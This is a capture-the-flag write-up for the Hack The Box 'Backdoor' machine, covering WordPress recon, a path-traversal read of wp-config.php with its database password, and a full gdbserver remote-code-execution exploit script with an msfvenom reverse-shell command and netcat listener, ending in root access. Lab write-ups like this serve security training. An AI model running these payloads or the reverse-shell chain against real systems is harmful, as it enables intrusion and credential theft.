---
title:  "Hackthebox-Backdoor"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/htb/htb.png
ribbon: MidnightBlue
categories:
  - CTF Writeups
toc: true
---


#### Description
* Let’s start with this machine.
* Download the VPN pack for the individual user and use the guidelines to log into the HTB VPN.
* The Backdoor machine is IP is 10.10.11.125

respect me on hack the box  [`https://www.hackthebox.eu/profile/251876`](https://www.hackthebox.eu/profile/251876)


# Recon 
First use nmap for port scanning

## nmap 
```
nmap -Pn -sV -sC -p- 10.10.11.125 -oN backdoor_nmap
```
Nmap shows 3 open ports
  -8080 open, running Tomcat



<img src="/img/backdoor/1nmap.PNG" alt="Getting-gz" width="800" height="440">

## browser
I installed  wappalyzer plugin to show what technology website used ,the target machine uses WordPress 5.8.1 CMS

<img src="/img/backdoor/2brow.PNG.PNG" alt="Getting-gz" width="800" height="440">

## wpscan
```
wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Tue Nov 30 19:28:02 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:23 <========================================================================================> (358 / 358) 100.00% Time: 00:00:23
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:54 <======================================================================================> (2575 / 2575) 100.00% Time: 00:02:54

[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <==========================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Nov 30 19:31:46 2021
[+] Requests Done: 3002
[+] Cached Requests: 8
[+] Data Sent: 837.136 KB
[+] Data Received: 18.224 MB
[+] Memory used: 225.582 MB
[+] Elapsed time: 00:03:44
```
## searchsploit
if you didn't find searchsploit ,install it
```
sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
```
<img src="/img/backdoor/install.PNG.PNG" alt="Getting-gz" width="800" height="440">

it was found that there are three vulnerabilities, but they are all plug-in vulnerabilities.

## Look at the website content
first add backdoor.htb to hosts
```
sudo nano /etc/hosts
10.10.11.125 backdoor.htb
```

## Directory Brute Force
gobuster finds many of the paths I already found, but als
```
gobuster dir -u http://backdoor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

<img src="/img/backdoor/gobuster.PNG" alt="Getting-gz" width="800" height="440">


# Exploit
```
http://backdoor.htb/wp-content/plugins/
```
<img src="/img/backdoor/plugin.PNG" alt="Getting-gz" width="800" height="440">

```
http://backdoor.htb/wp-content/plugins/ebook-download/
```
<img src="/img/backdoor/ebook.PNG" alt="Getting-gz" width="800" height="440">


## ebook-download exploit
Only readme.txt has content
```
http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
```
let's go to exploit-db to search for vulnerabilities
```
https://www.exploit-db.com/exploits/39575
```

<img src="/img/backdoor/read.PNG" alt="Getting-gz" width="800" height="440">


## poc cve
```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```


<img src="/img/backdoor/pocv.PNG" alt="Getting-gz" width="800" height="440">

download wp-config.php
<img src="/img/backdoor/wp-config.PNG" alt="Getting-gz" width="800" height="440">

i found DB password in the configuration  file and try to log in to the admin user with the database password but password incorrect
```
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
$currenthost = "http://".$_SERVER['HTTP_HOST'];
$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
$currentpath = preg_replace('/\/wp.+/','',$currentpath);
define('WP_HOME',$currenthost.$currentpath);
define('WP_SITEURL',$currenthost.$currentpath);
define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
@define('ADMIN_COOKIE_PATH', './');

define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
<script>window.close()</script>
```

## exploit 1337 port 
Use LFI to get info on port 1337 using proc. As the PID is unknown,

Just read the /proc/{pid}/cmdline file like this, where pid is a variable number,the number range should be between 900-1000




<img src="/img/backdoor/intruder.PNG" alt="Getting-gz" width="800" height="440">


<img src="/img/backdoor/intruder1.PNG.PNG" alt="Getting-gz" width="800" height="440">

## user flag
search about  gdbserver
```
https://www.exploit-db.com/exploits/50539
```

```
# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3


import binascii
import socket
import struct
import sys

help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''


def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'


def ack(sock):
    sock.send(b'+')


def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()


def exploit(sock, payload: str):
    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
    send(sock, '!')

    try:
        res = send(sock, 'vCont;s')
        data = res.split(';')[2]
        arch, pc = data.split(':')
    except Exception:
        print('[!] ERROR: Unexpected response. Try again later')
        exit(1)

    if arch == '10':
        print('[+] Found x64 arch')
        pc = binascii.unhexlify(pc[:pc.index('0*')])
        pc += b'\0' * (8 - len(pc))
        addr = hex(struct.unpack('<Q', pc)[0])[2:]
        addr = '0' * (16 - len(addr)) + addr
    elif arch == '08':
        print('[+] Found x86 arch')
        pc = binascii.unhexlify(pc)
        pc += b'\0' * (4 - len(pc))
        addr = hex(struct.unpack('<I', pc)[0])[2:]
        addr = '0' * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print('[+] Sending payload')
    send(sock, f'M{addr},{hex_length}:{payload}')
    send(sock, 'vCont;c')


def main():
    if len(sys.argv) < 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(':')
    file = sys.argv[2]

    try:
        with open(file, 'rb') as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f'[!] ERROR: File {file} not found')
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print('[+] Connected to target. Preparing exploit')
        exploit(sock, payload)
        print('[*] Pwned!! Check your listener')


if __name__ == '__main__':
    main()
            
```

## user shell
```
python3 exploit.py   10.10.11.125:1337 rev.bin
```
<img src="/img/backdoor/poc2.PNG" alt="Getting-gz" width="800" height="440">


<img src="/img/backdoor/pocuser.PNG" alt="Getting-gz" width="800" height="440">

# privesc
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
```
export TERM=xterm
screen -x root/root
```
```
root@Backdoor:~# whoami
whoami
root
```
